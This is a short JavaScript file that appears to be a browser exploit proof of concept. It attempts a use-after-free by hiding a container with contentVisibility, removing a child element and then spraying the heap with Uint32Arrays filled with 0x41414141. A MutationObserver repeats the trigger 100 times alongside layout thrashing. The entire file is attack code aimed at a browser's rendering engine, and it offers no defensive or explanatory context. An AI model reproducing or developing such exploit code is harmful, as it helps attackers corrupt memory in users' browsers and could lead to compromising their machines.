function debug_log(msg) {
  const log = document.getElementById("log");
  if (log) {
    log.textContent += msg + "\n";
  } else {
    console.log(msg);
  }
}

const container = document.querySelector(".container");
const child = document.querySelector(".child");

function heapSpray() {
  let spray = [];
  for (let i = 0; i < 0x30000; i++) {
    const arr = new Uint32Array(0x100);
    arr.fill(0x41414141);
    spray.push(arr);
  }
  return spray;
}

function layoutThrash() {
  const el = document.createElement("div");
  el.style.cssText = "position:absolute; left:0; top:0; width:100px; height:100px; transition:all 0.05s ease;";
  document.body.appendChild(el);
  let flip = false;
  for (let i = 0; i < 50; i++) {
    el.style.width = flip ? "100px" : "120px";
    flip = !flip;
  }
}

function triggerUAF() {
  if (!container || !child) return debug_log("Missing container or child.");
  container.style.contentVisibility = "hidden";
  child.remove();
  setTimeout(() => {
    container.style.contentVisibility = "auto";
    heapSpray();
    layoutThrash();
    debug_log("UAF triggered, memory spray completed.");
  }, 0);
}

function repeatTrigger(count) {
  let i = 0;
  const interval = setInterval(() => {
    if (i++ >= count) return clearInterval(interval);
    triggerUAF();
  }, 30);
}

const observer = new MutationObserver(() => {
  debug_log("DOM modified. Starting repeated UAF triggers.");
  repeatTrigger(100);
});

if (container) {
  observer.observe(container, { childList: true, subtree: true });
} else {
  debug_log("Container element not found.");
}
